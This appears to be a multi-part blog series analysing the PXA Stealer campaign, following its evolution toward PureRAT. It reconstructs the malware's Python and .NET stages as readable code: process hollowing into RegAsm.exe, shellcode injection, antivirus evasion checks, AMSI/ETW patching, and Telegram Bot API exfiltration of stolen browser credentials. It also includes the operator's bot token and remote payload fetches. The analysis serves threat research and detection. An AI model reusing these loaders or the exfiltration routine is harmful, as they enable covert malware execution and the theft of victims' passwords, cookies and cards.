1: Set important constants TARGET_EXE = r\u0026#34;C:\\\\Windows\\\\Microsoft.NET\\\\Framework\\\\v4.0.30319\\\\RegAsm.exe\u0026#34; runpe_base64_enc = ( \u0026#34;+6tGJXN5UjyfRXroEiesLPbnA+plBIk7JWOVuqd4Up3WQKfw0+Xmb......\u0026#34; # trimmed ) # Step 2: Decrypt the embedded payload key = b\u0026#34;7f5c3bde1499274ca4b7fc2c2d54025e\u0026#34; encrypted = base64.b64decode(runpe_base64_enc) payload = rc4(encrypted, key) # Step 3: Create a suspended target process (RegAsm.exe) startup_info = STARTUPINFO() process_info = PROCESS_INFORMATION() success = ctypes.windll.kernel32.CreateProcessA( ctypes.create_string_buffer(TARGET_EXE.encode()), None, None, None, False, CREATE_SUSPENDED, None, None, ctypes.byref(startup_info), ctypes.byref(process_info) ) # Step 4: List running processes process_list = subprocess.run( [\u0026#34;tasklist\u0026#34;], stdout=subprocess.PIPE, text=True, creationflags=subprocess.CREATE_NO_WINDOW ).stdout # Step 5: Antivirus process check for Avira, Norton, AVG, Avast, and BitDefender. av_processes = (\u0026#39;bdagent.exe\u0026#39;, \u0026#39;ProductAgentService.exe\u0026#39;, \u0026#39;AvastUI.exe\u0026#39;, \u0026#39;wsc_proxy.exe\u0026#39;,\u0026#39;afwServ.exe\u0026#39;, \u0026#39;aswEngSrv.exe\u0026#39;, \u0026#39;NortonSvc.exe\u0026#39;, \u0026#39;avgsvcx.exe\u0026#39;,\u0026#39;avgsvc.exe\u0026#39;, \u0026#39;avguard.exe\u0026#39;, \u0026#39;avshadow.exe\u0026#39;, \u0026#39;avscan.exe\u0026#39;, \u0026#39;sched.exe\u0026#39;,\u0026#39;avcenter.exe\u0026#39;, \u0026#39;avmailc.exe\u0026#39;, \u0026#39;avwebgrd.exe\u0026#39;, \u0026#39;avgnt.exe\u0026#39;, \u0026#39;avira.servicehost.exe\u0026#39;) if any(proc in process_list for proc in av_processes): sys.exit(0) # Step 6: Unmap original executable image (RegAsm.exe) ctypes.windll.ntdll.NtUnmapViewOfSection( process_info.hProcess, target_image_base ) # Step 7: Allocate memory in the target process for the new payload allocated_address = ctypes.windll.kernel32.VirtualAllocEx( process_info.hProcess, base_address, size_of_image, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE ) # Step 8: Write the decrypted PE payload into the allocated memory for section in pe.sections: remote_address = allocated_address + section.VirtualAddress data = payload[section.PointerToRawData : section.PointerToRawData + section.SizeOfRawData] ctypes.windll.ntdll.NtWriteVirtualMemory( process_info.hProcess, remote_address, ctypes.create_string_buffer(data), len(data), None ) # Step 9: Patch thread context to point to entry point of new PE context.Rcx = allocated_address + entry_point_offset # assuming 64-bit architecture ctypes.windll.kernel32.SetThreadContext( process_info.hThread, ctypes.byref(context) ) # Step 10: Resume the main thread to begin executing the injected payload ctypes.windll.kernel32.ResumeThread( process_info.hThread ) Stage 7 - Our first PE Payload # The first chain appears to Injection a malicious binary via Process Hollowing.\nThe PE payload doesn\u0026rsquo;t appear to use a custom Base64 alphabet like some of the earlier payloads, so we\u0026rsquo;ll decode it using CyberChef with a standard Base64 decoder followed by RC4 decryption using the known hardcoded key (b\u0026quot;7f5c3bde1499274ca4b7fc2c2d54025e\u0026quot;). This successfully produced a valid Windows executable.\nAfter successfully decoding and decrypting the payload we exported the result as stage 7.\nSHA256: f5e9e24886ec4c60f45690a0e34bae71d8a38d1c35eb04d02148cdb650dd2601 VirusTotal: No matches at time of analysis this appears to be previously unknown (undetected) malware. PEStudio will give the original file name from the metadata, wwctn_crypted.exe, suggests intentional encryption or obfuscation.\nLucky for us Detect It Easy identifies the binary as a .NET assembly, meaning it\u0026rsquo;s compiled into Microsoft Intermediate Language (IL), which can be easily decompiled into readable code using tools like dnSpy or ILSpy avoiding the dreaded ghidra for the time being.\nQuick Explanation: Why I Like .NET IL # When a .NET application is compiled, it doesn’t generate raw machine code like C or C++. Instead, it compiles to Microsoft Intermediate Language (IL) a low-level, platform-independent instruction set that\u0026rsquo;s executed by the .NET Common Language Runtime (CLR).\nIL is kinda human-readable, and retains much of the program\u0026rsquo;s high-level structure, such as:\nMethod and class names Control flow (loops, conditionals) Object-oriented structure Metadata and reflection This makes .NET binaries much easier to reverse engineer compared to native binaries. In many cases, you can recover near-original code using tools like:\ndnSpy – for live IL/C# browsing and editing ILSpy – for static decompilation dotPeek – JetBrains’ decompiler with more advanced feature sets Unless the binary is obfuscated or packed, you can usually step through the logic just like reading source code which makes analysing .NET malware far more approachable.\nUh Oh: Packing in .NET Malware # Unfortunately, Detect It Easy flags this binary as likely packed, based on heuristic signatures.\nEven though it’s a .NET assembly, the actual payload might be encrypted, compressed, or embedded inside a stub loader making static analysis more difficult.\nPacking in .NET works a lot like native packers.\nThe original assembly is hidden inside a wrapper (as a resource or byte array). A stub loader, often written in C#, decrypts and loads the real payload at runtime. This is usually done via reflection, Assembly.Load(), or even low-level API calls like VirtualAlloc and CreateThread. Why It’s Packed: # Evasion: Obfuscates strings, API calls, and signatures to bypass AV. Obfuscation: Hides the actual logic behind dynamic loading. Anti-analysis: The real payload might only exist in memory, making my life a lot harder. To extract the real code, you\u0026rsquo;ll likely need to execute the binary in a debugger, monitor memory, or hook the .NET runtime to dump the payload once it\u0026rsquo;s unpacked in memory.\nFLOSS\nBefore diving too deep into the IL or assembly, I like to run FLOSS against suspicious binaries to surface any obfuscated, encoded or runtime-generated strings.\nNote: Strings in .NET are stored as UTF-16, the typical strings command won\u0026rsquo;t return UTF-16LE without some special arguments (-el), but lucky for us FLOSS checks for a wide array of ways to store strings.\nRunning it on stage_7.exe immediately revealed some useful context:\nfloss.exe stage_7.exe\n+-------------------------------------+ | FLOSS STATIC STRINGS: UTF-16LE (40) | +-------------------------------------+ HCPWRnZ1MDRmSzRiy7FIZ/REdU1DWnV0MWF4eXduZ3dR... # Trunked Base64 String eHl3bmd3 ntdll.dll EtwEventWrite kernel32.dll VirtualProtect [+] Successfully unhooked ETW! GetProcAddress LoadLibraryA amsi.dll AmsiScanBuffer ... [+] URL/PATH : Arguments : http [+] Successfully patched AMSI! [!] Patching AMSI FAILED Looks like the author left behind some debugging strings for us, confirming that the malware is attempting two common runtime evasion techniques: patching AMSI and unhooking ETW.\nAMSI Patching # AMSI (Antimalware Scan Interface) allows AV engines to scan script content at runtime, including PowerShell, JavaScript, and .NET assemblies loaded dynamically. Malware often bypasses AMSI by patching the AmsiScanBuffer function in memory. This is usually done by overwriting the first few bytes with a stub that returns an error code like E_INVALIDARG, effectively disabling AMSI checks.\nThe result: any malicious code loaded dynamically goes unscanned by AV solutions relying on AMSI.\nETW Unhooking # ETW (Event Tracing for Windows) is used by Windows internals, EDRs, and logging frameworks to track execution flow, including things like thread creation, memory allocation, and .NET method calls. To hide its activity, the malware patches the EtwEventWrite function in ntdll.dll, typically replacing it with a stub.\nThis disables telemetry without crashing the process, rendering runtime behaviour invisible to most monitoring tools.\nPossibly Another Payload? # One Base64 string in the FLOSS output stood out, its very long and not immediately decodable via CyberChef. That usually raises flags.\nWe\u0026rsquo;ll load it into dnSpy, and try searching for references to the start of the Base64 string.\nWe can see its pulled us right into the Main() function of NetLoader module, this is the only module in this program and will be all the \u0026ldquo;user\u0026rdquo; code.\nFirst we see the calls to NetLoader.PatchETW() and NetLoader.PathAMSI() then we have two string defined here text and text1 (With text1 being our suspected payload), lets stop an appreciate how nice is it just to have straight decompiled code, wow I love .NET.\nAfter the base64 there are two more command which make up the main function.\nbyte[] array = Convert.FromBase64String(text2); NetLoader.encDeploy(array, text); Lets check out the encDeploy function which seems to use the first smaller string. Clicking on it jumps us to that function, which consist of the one liner.\nNetLoader.invokeCSharpMethod(NetLoader.getEntryPoint(NetLoader.loadASM(NetLoader.xorEncDec(data, xorKey)))); working backwards xorEncDec is next up, which consist of\nprivate static byte[] xorEncDec(byte[] inputData, string keyPhrase) { byte[] array = new byte[inputData.Length]; for (int i = 0; i \u0026lt; inputData.Length; i++) { array[i] = inputData[i] ^ Encoding.UTF8.GetBytes(keyPhrase)[i % Encoding.UTF8.GetBytes(keyPhrase).Length]; } return array; } This is a standard XOR decoding routine that uses a UTF-8 string as the key, and if we recall from earlier, that smaller string is likely the xorPhrase.\nRebuilding the routine in CyberChef (Base64 → XOR with key), we successfully extracted another executable which we will refer to as stage 8.\nSHA256: 06FC70AA08756A752546198CEB9770068A2776C5B898E5FF24AF9ED4A823FD9D Original filename: maegkffm.exe Detection: No hits on VirusTotal — appears to be previously unknown. While that’s interesting on its own, we’re not jumping ahead. Instead, let’s follow the full code path to see how it’s used.\nOnce the payload is decrypted, it’s passed into NetLoader.loadASM(decryptedBytes) which uses the built-in .NET method Assembly.Load(byte[]), which loads the executable directly into memory, the flow continues through getEntryPoint(memoryAssembly) which retrieves the entry point of the loaded assembly and finally invokeCSharpMethod(entryPoint) executes the method via reflection.\nModular Loader Design # This loader \u0026ldquo;NetLoader\u0026rdquo; appears to be modular in nature. Beyond just decrypting and executing the embedded payload, it also includes a method named TriggerPayload() which supports multiple delivery mechanisms, either reading an XOR-encoded payload from disk or downloading one from the internet.\nHowever, in the sample we\u0026rsquo;re analysing today, TriggerPayload() is never actually called. So while this flexibility may be intended for other campaigns or later stages, it\u0026rsquo;s not relevant to this specific execution chain at this time.\nOnto Payload 2 - Shellcode Decryption and Execution # Following the execution of the first PE payload via process hollowing, Stage 6 proceeds with a second chain this time opting for direct shellcode injection into the current process, rather than hollowing an external binary.\nChain 2 — In-Memory Shellcode Execution # shellcode_base64_enc = (\u0026#34;+6tGJXN5UjyfRXroEiesLPbnA+plBIk7JWOVuqd4Up3WQKfw0+X........\u0026#34;) # Step 1: Decrypt the final shellcode payload shellcode_key = b\u0026#34;ec7ee0dbc7a6bacdeb4eb7409cd46699\u0026#34; encrypted_shellcode = base64.b64decode(shellcode_base64_enc) buf = rc4(encrypted_shellcode, shellcode_key) # Step 2: Allocate memory for the shellcode in the current process address = ctypes.windll.kernel32.VirtualAlloc( None, len(buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE ) # Step 3: Copy the shellcode into the allocated memory ctypes.windll.kernel32.RtlMoveMemory( address, ctypes.create_string_buffer(buf), len(buf) ) # Step 4: Create a thread to execute the shellcode ctypes.windll.kernel32.CreateThread( None, 0, address, None, 0, None ) I won’t be diving into this shellcode payload here partly because this write-up is already dense enough, but mostly because shellcode analysis is a world of its own. It deserves a dedicated section where we can unpack it properly without glossing over the details.\nFor now, it’s enough to note that Stage 6 concludes by injecting and executing raw shellcode in memory, reinforcing the adversary’s shift toward low-level, stealthy execution techniques.\nQuick Recap: What Did We Find in Part 4? # Stage 6 marked a major turning point, pivoting from Python scripts to compiled Windows executables delivered entirely in-memory. What started with another exec(requests.get().text) call quickly escalated into advanced process hollowing and shellcode injection techniques.\nThis stage introduced:\nMassive Python bytecode payload (~3 MB) carrying embedded PE and shellcode\nHybrid decryption routines (Base64 + RC4 + XOR) re-used\nProcess hollowing into RegAsm.exe to execute a hidden PE payload\nAV process checks with targeted exits against Avira, Norton, Avast, AVG, BitDefender\nExtraction of Stage 7: a packed .NET loader with modular design\nRuntime evasion tactics: AMSI patching and ETW unhooking\nDiscovery of Stage 8, an additional .NET executable loaded purely via reflection\nEvidence of a second payload chain direct shellcode execution\nEach element reinforced the attacker’s progression toward a layered, modular loader framework that:\nExecutes everything in-memory to avoid file-based detection Disables core Windows security interfaces (AMSI, ETW) to blind AV/EDR Chains multiple loaders together, each responsible for decrypting and delivering the next Demonstrates a low-level emphasis on stealth, resilience, and modularity Up Next: Part 5 — .NET Loader Deep Dive # Stage 7 may have given us an obfuscated EXE, but Stage 8 takes the gloves off: a true .NET loader designed to make any analyst go insane.\nthe attackers abandon simple tricks and begin leaning on the full power of .NET assemblies. Every type name, every method call, even the decryption keys themselves are hidden under layers of runtime-only obfuscation, buried in code designed to waste an analyst’s time. All to drop a .NET Reactor–protected DLL, ramping up the difficulty curve again.\nStay tuned for Part 5, where we pivot into dynamic memory dumping and debugger-assisted tracing to peel back this next layer — and discover just how far this campaign is willing to go to stay invisible.\nFrom simple obfuscation to full-blown commercial protections, Stage 8 marks the turning point where analysis becomes a contest between analyst and threat actor.\n","date":"1 September 2025","externalUrl":null,"permalink":"/posts/python_malware_part4/","section":"Blog","summary":"The campaign shifts from Python to compiled .NET executables using process hollowing for in-memory PE injection, AMSI patching, and ETW unhooking to evade detection and establish persistence.","title":"PXA Stealers Evolution to PureRAT: Part 4 - .NET Payload Analysis (Stage 6 \u0026 7)","type":"posts"},{"content":" Introduction # In this section, we dissect the weaponised Python payload at the heart of the attack chain. This is the first weaponzied stage and it is a fully fledged information stealer that operates in-memory, and exfiltrates data via Telegram.\nWe\u0026rsquo;ll analyse the decrypted bytecode from the previous stage, examine extraction routines targeting Chrome-based browsers, and review AV enumeration techniques using WMI. We\u0026rsquo;ll also explore the exfiltration logic that leverages Telegram’s Bot API, along with subtle hints suggesting that the campaign is far from over.\nThe InfoStealer # Looking at the next payload in the chain from https://is[.]gd/s5xknuj2, it’s immediately clear that it’s significantly larger than the previous stages. As with Stage 3, this payload is encrypted and appears to use the same hybrid decryption module though with a different key this time.\nUsing the Python script we wrote earlier, we load in the new payload, swap out the key, and successfully decrypt it. The result: a disassembled Python bytecode dump.\nThe decrypted output is massive, around 6,000 lines. From a quick glance, this definitely looks like the final stage.\nGiven the size, I decided to save the decrypted bytecode as a .pyc file and run it through strings for a more compact and readable view. Starting with a search for underscores (_) helps surface variable and function names that follow common naming conventions.\nStrings .\\decrypted_payload_5.pyc | Select-String -Pattern \u0026quot;_\u0026quot; | Get-Content -Head 20\nZ_d Z_eWZ`eYZatZe] create_unicode_buffer pbkdf2_hmac) ch_dc_browsers installed_ch_dc_browsers os_cryptZ encrypted_key local_state ch_master_keyr) get_ch_master_key MODE_GCM decrypted_passr) decrypt_ch_value MODE_CBCrC decoded_itemZ master_passwordZ global_saltZ We notice that many function names that suggest data extraction routines begin with get. From here, searching for \u0026quot;get\u0026quot; provides even more insight:\nStrings .\\decrypted_payload_5.pyc | Select-String -Pattern \u0026quot;get\u0026quot;\nget_ch_master_key getKey ... get_gck_basepath^ ... get_gck_profiless get_ch_google_token ... get_ch_login_data ... get_ch_cookies get_ch_ccards get_ch_autofill GetIPB get_installed_av getenvZ getlogin getbufferZ ... This paints a fairly clear picture: this is an information stealer. It goes after Chrome and Mozilla based browser, looking for login data, cookies, saved credit cards, autofill entries, and 2FA tokens, which is all fairly standard these days.\nHowever, one function that stands out is get_installed_av, which appears to enumerate installed antivirus products. That’s worth digging into.\nDissecting get_installed_av # Here’s a disassembly snippet of the get_installed_av function:\nDisassembly of \u0026lt;code object get_installed_av at 0x1051a8710, file \u0026#34;\u0026lt;string\u0026gt;\u0026#34;, line 864\u0026gt;: .... 867 8 LOAD_GLOBAL 1 (win32com) 10 LOAD_ATTR 2 (client) 12 LOAD_METHOD 3 (Dispatch) 14 LOAD_CONST 1 (\u0026#39;WbemScripting.SWbemLocator\u0026#39;) 16 CALL_METHOD 1 18 STORE_FAST 1 (wmi) 868 20 LOAD_FAST 1 (wmi) 22 LOAD_METHOD 4 (ConnectServer) 24 LOAD_CONST 2 (\u0026#39;.\u0026#39;) 26 LOAD_CONST 3 (\u0026#39;root\\\\SecurityCenter2\u0026#39;) 28 CALL_METHOD 2 30 STORE_FAST 2 (conn) 869 32 LOAD_FAST 2 (conn) 34 LOAD_METHOD 5 (ExecQuery) 36 LOAD_CONST 4 (\u0026#39;SELECT * FROM AntiVirusProduct\u0026#39;) 38 CALL_METHOD 1 40 STORE_FAST 3 (products) 870 42 LOAD_FAST 3 (products) \u0026gt;\u0026gt; 44 GET_ITER 46 FOR_ITER 8 (to 56) 48 STORE_FAST 4 (product) 871 50 LOAD_FAST 0 (antivirus_list) 52 LOAD_METHOD 6 (add) 54 LOAD_FAST 4 (product) \u0026gt;\u0026gt; 56 LOAD_ATTR 7 (displayName) ... 874 84 LOAD_FAST 0 (antivirus_list) 86 RETURN_VALUE 876 88 \u0026lt;119\u0026gt; 0 The critical lines (Converted back to python) here are:\nimport win32com wmi = win32com.client.Dispatch(\u0026#34;WbemScripting.SWbemLocator\u0026#34;) conn = wmi.ConnectServer(\u0026#34;.\u0026#34;, \u0026#34;root\\\\SecurityCenter2\u0026#34;) products = conn.ExecQuery(\u0026#34;SELECT * FROM AntiVirusProduct\u0026#34;) This uses WMI (Windows Management Instrumentation) via the win32com.client module to connect to the SecurityCenter2 namespace and enumerate installed antivirus products using the AntiVirusProduct class. The results are then appended to a list.\nThis is a perfect example of LOLBINs being used. A lot of the time you\u0026rsquo;ll see a big list of hardcoded security products which the threat actor loops through searching for, but in this case this is the equivalent of asking Windows, \u0026ldquo;Hey what AV do you have installed?\u0026rdquo; and Windows gives it to them.\nI was hoping for something more exciting here, maybe some defence evasion or attempts to kill the AV products but if we follow this through, it simply sends the data back to the threat actor.\nBut this also hints at a further stage for installing a RAT. Typically, the threat actor will only collect information like this if they intend to push additional malware to the host.\nExfiltration via Telegram # 18 336 LOAD_CONST 17 (\u0026#39;7414494371:AAHsrQDkPrEVyz9z0RoiRS5fJKI-ihKJpzQ\u0026#39;) 338 STORE_NAME 49 (TOKEN_BOT) 26 340 LOAD_CONST 18 (\u0026#39;-1002460490833\u0026#39;) 342 STORE_NAME 50 (CHAT_ID_NEW) 27 344 LOAD_CONST 19 (\u0026#39;-1002469917533\u0026#39;) 346 STORE_NAME 51 (CHAT_ID_RESET) 28 348 LOAD_CONST 20 (\u0026#39;-4530785480\u0026#39;) 350 STORE_NAME 52 (CHAT_ID_NEW_NOTIFY) .... 918 2838 LOAD_NAME 5 (requests) 2840 LOAD_ATTR 155 (post) 919 2842 EXTENDED_ARG 1 2844 LOAD_CONST 266 (\u0026#39;https://api.telegram.org/bot\u0026#39;) Moving on it appears the malware is once again using Telegram as its communication channel, which is increasingly common. As a widely used and “trusted” platform, Telegram traffic often evades detection and filtering by firewalls and security products.\nThe malware uses a single bot token to send messages but communicates with three distinct Telegram chat IDs:\nCHAT_ID_NEW_NOTIFY CHAT_ID_RESET CHAT_ID_NEW We can work backwards from the disassembled code to determine what data is sent to each chat and under what conditions.\nOnce again to make understanding this process easier, I\u0026rsquo;ve converted the disassembled bytecode back into readable Python source code.\nThe first step in this process is archiving the collected data into a ZIP file.\narchive_path = os.path.join( TMP, f\u0026#34;[{Country_Code}_{IPV4}] {os.getenv(\u0026#39;COMPUTERNAME\u0026#39;, \u0026#39;defaultValue\u0026#39;)}.zip\u0026#34; ) # Create zip with compression with zipfile.ZipFile(zip_data, \u0026#39;w\u0026#39;, compression=zipfile.ZIP_DEFLATED, compresslevel=9) as zip_file: zip_file.comment = f\u0026#34;Time Created: {creation_datetime}\\nContact: https://t.me/LoneNone\u0026#34;.encode() for root, _, files in os.walk(Data_Path): for name in files: try: file_path = os.path.join(root, name) arcname = os.path.relpath(file_path, Data_Path) zip_file.write(file_path, arcname) except Exception: pass # Write the in-memory zip to disk try: with open(archive_path, \u0026#39;wb\u0026#39;) as f: f.write(zip_data.getbuffer()) except Exception: pass There one line there which stands out to me, zip_file.comment = f\u0026quot;Time Created: {creation_datetime}\\nContact: https://t.me/LoneNone\u0026quot;.encode() This includes a contact field pointing to a Telegram handle: @LoneNone, which is likely the malware author or operator.\nThis detail strongly suggests a link to PXA Stealer, a lesser-known info-stealer which was discovered in Nov 2024 by Talos. While public reporting on this malware remains limited, several indicators align with earlier PXA samples, albeit with notable changes, including different filenames (e.g., images.png, svchost.exe) and hardened infrastructure.\nThe overall structure and techniques remain consistent, but the threat actor appears to have refined their tooling and operational security.\nBack in the code, the function continues by generating a summary message of the ZIP archive, including victim metadata and extracted credential statistics.\n# Construct message body message_body = ( f\u0026#34;{GetIPD}\\n\u0026#34; f\u0026#34;\u0026lt;b\u0026gt;User:\u0026lt;/b\u0026gt; \u0026lt;code\u0026gt;{os.getlogin()}\u0026lt;/code\u0026gt;\\n\u0026#34; f\u0026#34;\u0026lt;b\u0026gt;AntiVirus:\u0026lt;/b\u0026gt; \u0026lt;i\u0026gt;{\u0026#39;\u0026lt;/i\u0026gt;, \u0026lt;i\u0026gt;\u0026#39;.join(AV_List) if AV_List else \u0026#39;Unknown\u0026#39;}\u0026lt;/i\u0026gt;\\n\u0026#34; f\u0026#34;\u0026lt;b\u0026gt;Browser Data:\u0026lt;/b\u0026gt; \u0026lt;code\u0026gt;\u0026#34; f\u0026#34;CK:{total_browsers_cookies_count}\u0026#34; f\u0026#34;|PW:{total_browsers_logins_count}\u0026#34; f\u0026#34;|AF:{total_ch_autofill_count}\u0026#34; f\u0026#34;|CC:{total_browsers_ccards_count}\u0026#34; f\u0026#34;|TK:{total_browsers_tokens_count}\u0026#34; f\u0026#34;|FB:{total_browsers_fb_count}\u0026#34; f\u0026#34;|GADS:{google_ads_cookie}\u0026lt;/code\u0026gt;\\n\u0026#34; It then determines which Telegram chat to notify, based on whether a count is set to 1:\n# Determine Telegram chat ID CHAT_ID = CHAT_ID_NEW if Count == 1 else CHAT_ID_RESET # Send info to Telegram if Count == 1 and CHAT_ID_NEW_NOTIFY: requests.post( f\u0026#34;https://api.telegram.org/bot{TOKEN_BOT}/sendMessage\u0026#34;, params={ \u0026#34;chat_id\u0026#34;: CHAT_ID_NEW_NOTIFY, \u0026#34;text\u0026#34;: message_body, \u0026#34;parse_mode\u0026#34;: \u0026#34;HTML\u0026#34; } ).raise_for_status() with open(archive_path, \u0026#39;rb\u0026#39;) as f: response_document = requests.post( f\u0026#34;https://api.telegram.org/bot{TOKEN_BOT}/sendDocument\u0026#34;, params={ \u0026#34;chat_id\u0026#34;: CHAT_ID, \u0026#34;caption\u0026#34;: message_body, \u0026#34;parse_mode\u0026#34;: \u0026#34;HTML\u0026#34;, \u0026#34;protect_content\u0026#34;: True }, files={ \u0026#34;document\u0026#34;: f } ) response_document.raise_for_status() From this logic, we can map out the behaviour based on the Count variable:\nVariable Used for When Used Data Sent CHAT_ID_NEW Main data If Count == 1 Zip archive, message CHAT_ID_RESET Fallback / reinfection If Count != 1 Zip archive, message CHAT_ID_NEW_NOTIFY Notification channel If Count == 1 Text-only notification The Count variable plays a central role here, but it’s not defined within this stage, from what I can tell anyway. It\u0026rsquo;s likely set earlier in the execution chain and persisted across stages. This structure may function as a reinfection check. The malware may be designed to distinguish between newly infected and previously compromised hosts, adjusting its reporting behaviour accordingly. Helping the threat actor track infections over time, whilst reduce noise from duplicate logs, and possibly prioritise newly compromised hosts.\nAlternatively, CHAT_ID_RESET may serve as a fallback receiver, used when delivery to the primary channel is no longer appropriate or fails.\nStage 6 # Just as it seemed like we had reached the end of the chain, lo and behold, there’s a sixth stage hiding in all that bytecode:\n812 3036 LOAD_NAME 164 (exec) 3038 LOAD_NAME 5 (requests) 3040 LOAD_METHOD 165 (get) 3042 EXTENDED_ARG 1 3044 LOAD_CONST 278 (\u0026#39;https://0x0[.]st/8WBr.py\u0026#39;) 3046 CALL_METHOD 1 \u0026gt;\u0026gt; 3048 LOAD_ATTR 166 (text) This snippet downloads and executes a remote Python script from using requests.get(https://0x0[.]st/8WBr.py).text passed directly to exec().\nIf we curl that URL, we can retrieve the next payload:\nexec(__import__(\u0026#39;marshal\u0026#39;).loads(__import__(\u0026#39;zlib\u0026#39;).decompress(__import__(\u0026#39;base64\u0026#39;).b85decode(\u0026#34;c|c}\u0026lt;pdtmL_\u0026lt;+xYeC9v$TMlKnG)a?0A\u0026lt;-MXPy-SYpdMKzA.....)))) Once again, this stage closely mirrors Stage 2 only this time, the payload is significantly larger than anything encountered so far.\nQuick Recap: What Did We Find in Part 3? # What began as an encrypted blob from a Telegram-triggered redirect evolved into a weaponised final payload a full-featured Python information stealer operating entirely in-memory.\nThis stage introduced:\nExtraction of Chrome and Firefox browser data (passwords, cookies, credit cards, 2FA tokens) AV enumeration via WMI (no hardcoded checks—Windows is asked directly) Stealthy exfiltration of stolen data using Telegram Bot API Archive creation with metadata linking to operator (@LoneNone) Dynamic victim profiling using a Count flag to control reporting and reinfection logic Discovery of Stage 6, loaded on the fly via exec(requests.get().text) from 0x0.st Each step was executed without writing new files to disk, maintaining a memory-only footprint that:\nReduces detection by AV and EDR tools Enables flexible updates through Telegram and URL shorteners Suggests a modular, ongoing campaign—potentially linked to the evolving PXA Stealer family Up Next: Part 4 — .NET Payload Analysis # Just when we thought Stage 5 was the final payload, Stage 6 pulled the rug out with a massive Base85 blob and in-memory decryption chain.\nBut it gets better (or worse):\nThat decoded blob leads to our first Windows PE executable, stealthily injected into a suspended RegAsm.exe process a classic process hollowing technique.\nStay tuned for Part 4, we shift gears into the world of .NET malware, where the payload:\nExecutes fully in-memory via .NET reflection Unhooks ETW and patches AMSI to blind monitoring tools Deploys yet another embedded binary, suggesting even more stages to come From Python to PE, from Base85 to reflection — this campaign isn’t just multi-stage. It’s multi-language, multi-layered, and still escalating.\n","date":"31 August 2025","externalUrl":null,"permalink":"/posts/python_malware_part3/","section":"Blog","summary":"Dissect PXA Stealer’s weaponized info-stealing payload that extracts Chrome credentials, cookies, and 2FA tokens using WMI for AV enumeration before exfiltrating everything via Telegram’s Bot API.","title":"PXA Stealers Evolution to PureRAT: Part 3 - Weaponised Python Stage (Stage 5)","type":"posts"},{"content":" Introduction # In this section, we shift from traditional file-based malware to payloads that operate entirely in memory. We\u0026rsquo;ll explore how the malware decrypts its internal components, loads Python bytecode dynamically, and uses custom cryptographic loaders to evade detection.\nThis stage marks a significant escalation in sophistication moving beyond simple obfuscation into multi-layered, in-memory execution chains that are harder to detect, analyse, and contain.\nDecoding Stage Three: Base85 Bytecode # We left off after discovering a base85-encoded string, which appears to be our next stage in the malware’s execution chain.\nNormally, I’d decode this using CyberChef, but in this case, it doesn\u0026rsquo;t support the custom Base85 alphabet used by the malware. (We won’t dive too deep here, but if you inspect the base64.py file bundled with the malware, you’ll see it uses a custom alphabet.)\nInstead of decoding it manually, we’ll let the malware do the work by modifying the original command like so:\nimport dis dis.dis(__import__(\u0026#39;marshal\u0026#39;).dumps(__import__(\u0026#39;zlib\u0026#39;).decompress(__import__(\u0026#39;base64\u0026#39;).b85decode(\u0026#34;c$|ee*\u0026gt;\u0026gt;VcmVoh+\u0026amp;b9W+s_L$Gdue00b.....\u0026#34;)))) We’ve made two key changes:\nRedirected from exec to Python’s built-in dis module to disassemble the bytecode. Swapped out marshal.loads() for marshal.dumps() to keep the bytecode in a state dis can process. Result: Disassembled Bytecode for Stage 3\nIf you\u0026rsquo;ve used tools like Ghidra or IDA , this output might feel familiar, it\u0026rsquo;s Python\u0026rsquo;s equivalent of assembly. While it\u0026rsquo;s often possible to decompile Python bytecode back into readable source (with the right magic bytes), I couldn’t get it to work in this case. So instead, we’ll be working directly with this lower-level \u0026ldquo;assembly-style\u0026rdquo; output.\nAs we go through the disassembled output, we can note a few important strings and operations, such as:\n126 LOAD_CONST 3 ((\u0026#39;b64decode\u0026#39;,)) .... 178 LOAD_CONST 7 ((\u0026#39;AES\u0026#39;, \u0026#39;DES3\u0026#39;, \u0026#39;PKCS1_OAEP\u0026#39;)) .... 198 LOAD_CONST 8 ((\u0026#39;RSA\u0026#39;,)) .... 280 LOAD_CONST 15 (\u0026#39;decompress\u0026#39;) .... 288 LOAD_CONST 17 (\u0026#39;rc4\u0026#39;) .... 296 LOAD_CONST 19 (\u0026#39;aes_decrypt\u0026#39;) .... 304 LOAD_CONST 21 (\u0026#39;xor\u0026#39;) .... 328 LOAD_METHOD 16 (b64decode) 330 LOAD_CONST 26 (\u0026#39;LS0tLS1CRUdJTiBSU0EgUFJ..... 334 STORE_NAME 49 (private_key) .... 344 LOAD_NAME 48 (hybrid_decrypt) 346 LOAD_CONST 29 (\u0026#39;c$@+K1OoexoWdBsm1!pkF\u0026gt;7T}ij 348 LOAD_NAME 49 (private_key) 352 STORE_NAME 51 (code) .... 354 LOAD_NAME 50 (runner) 356 LOAD_NAME 51 (code) This isn\u0026rsquo;t the full disassembly just enough to give you a snapshot of how we step through bytecode to figure out what the malware is doing.\nIn this case, we can clearly see it importing several encoding and encryption functions, including:\nb64decode AES RSA decompress rc4 XOR Following that, there\u0026rsquo;s a long Base64-encoded string assigned to a variable named private_key. This is passed into a function called hybrid_decrypt, alongside an encrypted string which is saved as code.\nFinally, the decrypted code is passed into a function named runner, which as the name suggests executes it.\nBingo, we’ve found Stage 4.\nDecrypting Stage 4 # This is where things get messy.\nNote: This would’ve been much easier if we were able to decompile the bytecode having the original source would have allowed for quick copy-pasting of the decryption functions.\nInstead, we’re forced to reconstruct the source code manually by reading through and rebuilding the original decryption logic from the disassembled bytecode.\nBelow is the disassembly of the hybrid_decrypt function extracted from the bytecode:\nDisassembly of \u0026lt;code object hybrid_decrypt at 0x0000024C48E6B9F0, file \u0026#34;\u0026lt;string\u0026gt;\u0026#34;, line 42\u0026gt;: 44 0 LOAD_GLOBAL 0 (base64) 2 LOAD_METHOD 1 (b85decode) 4 LOAD_FAST 0 (base85_encoded_data) 6 CALL_METHOD 1 8 STORE_FAST 2 (compressed_data) 45 10 LOAD_GLOBAL 2 (decompress) 12 LOAD_FAST 2 (compressed_data) 14 CALL_FUNCTION 1 16 STORE_FAST 3 (encrypted_data) 47 18 LOAD_FAST 3 (encrypted_data) 20 LOAD_CONST 0 (None) 22 LOAD_CONST 1 (256) 24 BUILD_SLICE 2 26 BINARY_SUBSCR 28 STORE_FAST 4 (rsa_encrypted_key) 48 30 LOAD_FAST 3 (encrypted_data) 32 LOAD_CONST 1 (256) 34 LOAD_CONST 0 (None) 36 BUILD_SLICE 2 38 BINARY_SUBSCR 40 STORE_FAST 5 (aes_encrypted) 51 42 LOAD_GLOBAL 3 (rsa_decrypt) 44 LOAD_FAST 4 